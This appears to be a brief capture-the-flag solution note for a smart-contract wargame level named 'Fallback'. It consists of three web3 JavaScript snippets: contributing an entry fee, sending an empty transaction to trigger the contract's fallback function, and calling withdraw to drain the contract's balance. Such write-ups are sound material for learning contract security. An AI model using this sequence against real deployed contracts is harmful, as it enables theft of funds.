Fallback notes
1. entry fee
      // transfer some funds
      const entryFee = 13;
      await game.contribute({ from: player, value: entryFee });

1. utilize fallback method
      // trigger fallback function
      await web3.eth.sendTransaction({
        to: game.address,
        from: player,
        value: 1,
        data: "",
      });

1. drain account
      // drain account
      await game.withdraw({ from: player });

